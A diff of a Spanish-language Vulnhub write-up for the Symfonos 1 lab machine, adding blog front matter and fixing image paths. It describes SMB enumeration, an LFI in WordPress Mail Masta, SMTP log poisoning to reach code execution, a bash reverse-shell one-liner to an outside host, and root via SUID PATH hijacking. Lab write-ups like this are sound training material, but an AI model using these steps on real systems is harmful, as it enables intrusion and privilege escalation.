@@ -1,4 +1,22 @@
+---
+layout: single
+title: Symfonos 1 - Vulnhub
+date: 10/11/2023
+classes: wide
+header:
+  teaser_home_page: true
+  icon: /assets/images/vulnhub.webp
 
+tags:
+  - SMB enumeration
+  - Information Leakage
+  - WordPress enumeration
+  - Abusing WordPress plugin - Mail Masta 1.0
+  - LFI
+  - Log Poisoning to log's SMTP > RCE
+  - Abusing SUID privilege
+  - PATH Hijacking
+---
 
 
 # PortScan
@@ -58,7 +76,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 # Web Site
 ___
-![[Pasted image 20231110114002.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110114002.png)
 
 
 # Enumeración SMB
@@ -70,7 +88,7 @@ Cuando escaneamos los puertos vimos que en el **:445** está corriendo un **SMB*
 smbmap -H 192.168.x.x
 ```
 
-![[Pasted image 20231110114741.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110114741.png)
 
 Tendríamos permisos para leer el directorio de "**anonymous**" así que entramos para ver qué hay.
 
@@ -78,28 +96,28 @@ Tendríamos permisos para leer el directorio de "**anonymous**" así que entramo
 smbmap -H 192.168.x.x -r anonymous
 ```
 
-![[Pasted image 20231110114922.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110114922.png)
 
 Tenemos un **.txt** dentro del directorio "**anonymous**" que podemos leer, procedemos a descargárnoslo en local para ver qué contiene.
 ```bash
 smbmap -H 192.168.204.158 -r anonymous --download anonymous/attention.txt
 ```
 
-![[Pasted image 20231110115529.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110115529.png)
 
 Aparentemente es una pista de posibles claves para usuarios válidos del sistema, pero aún no conocemos ninguno, sin embargo, a la hora de la enumeración de los recursos **SMB**, vimos que un directorio como comentario tiene "**Helios Personal Share**", por lo qué probablemente exista un usuario llamado "**Helios/helios**", así que procedemos a intentar conectarnos como el usuario helios con las contraseñas típicas qué pudimos obtener del directorio "anonymous".
 
 
-![[Pasted image 20231110120017.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110120017.png)
 
 Logramos entrar a **SMB** como el usuario **Helios**, y ahora podemos leer su directorio personal, por lo qué entramos a ver qué hay.
 
-![[Pasted image 20231110120125.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110120125.png)
 
 Tenemos 2 .**txt's** así qué procedemos a descargarnoslos para ver qué hay.
 
 
-![[Pasted image 20231110120259.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110120259.png)
 
 Un **txt** aparentemente nos chiva lo que podría ser un directorio, probamos este directorio en el servicio web del **:80**, a ver sí existe.
 
@@ -108,19 +126,19 @@ Un **txt** aparentemente nos chiva lo que podría ser un directorio, probamos es
 ______
 
 
-![[Pasted image 20231110120550.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110120550.png)
 
 El directorio existe, y está con un CMS **WordPress**, sí vemos el código fuente tendríamos a la vista varios **plugins** del CMS, encontrándonos así con que existe el plugin Mail-Masta.
 
-![[Pasted image 20231110121140.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110121140.png)
 
 Sí buscamos en **exploit-db** vulnerabilidades existentes para **Mail-Masta**, encontraríamos este [PoC](https://www.exploit-db.com/exploits/40290) qué nos da una ruta donde podemos llevar a cabo un **LFI**.
 
-![[Pasted image 20231110121517.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110121517.png)
 
 Se me ocurrió tratar de ver claves privadas de **SSH**, ver log's de SSH & Apache, pero no logré ver nada, lo qué sí podíamos ver eran los log's del servicio **SMTP**.
 
-![[Pasted image 20231110121818.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110121818.png)
 
 Estamos logrando ver los log's del **SMTP** para el usuario **helios**, y como vemos en la **URL** se está interpretando por **PHP**, por lo qué se me ocurre llevar a cabo un **Log Poisoning** enviando un correo con código PHP malicioso a helios.
 
@@ -133,12 +151,12 @@ De forma qué podremos controlar el comando qué queramos ejecutar desde la URL.
 
 A continuación se muestra una imagen de como se envió el correo con código malicioso PHP.
 
-![[Pasted image 20231110122836.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110122836.png)
 
 Sí todo ha ido bien, deberíamos ejecutar comando en la URL.
 
 
-![[Pasted image 20231110123058.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110123058.png)
 
 Hemos convertido el **Log Poisoning** en un **RCE**, así que ya podríamos entablarnos una Reverse Shell.
 
@@ -148,7 +166,7 @@ Hemos convertido el **Log Poisoning** en un **RCE**, así que ya podríamos enta
 bash -c "bash -i >%26 /dev/tcp/192.168.x.x/port 0>%261"
 ```
 
-![[Pasted image 20231110123554.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110123554.png)
 
 Y ya estaríamos dentro de la máquina, faltaría darle **Tratamiento a la TTY**, qué si no sabes cómo, te recomiendo [((IR AQUÍ))](https://4uli.github.io/tratamiento-tty/)
 
@@ -165,14 +183,14 @@ find / -perm -4000 2>/dev/null
 ```
 
 Encontrando así un binario con nombre "**statuscheck** y SUID de ROOT".
-![[Pasted image 20231110124116.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110124116.png)
 
 Investigando este binario, al hacerle un string, descubrí qué está haciendo una petición con "curl" pero sólo está llamando la ruta relativa, por lo qué podríamos llevar a cabo un **Path Hijacking.**
 
 ```bash
 strings /opt/statuscheck 
 ```
-![[Pasted image 20231110124319.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110124319.png)
 
 
 Para llevar a cabo nuestro **Path Hijacking**, vamos a donde podamos escribir, en este caso "**/tmp/**" para crear allí un archivo script malicioso en **C** con el mismo nombre de "**curl**" y modificar la variable de entorno del OS.
@@ -209,7 +227,7 @@ Ahora modificamos la variable de entorno del **OS** poniendo la ruta **"/tmp/"**
 export PATH=/tmp/:$PATH
 ```
 
-![[Pasted image 20231110125050.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110125050.png)
 
 Ahora al ejecutar el "**statuscheck**" obtendríamos una bash como **ROOT**.
 
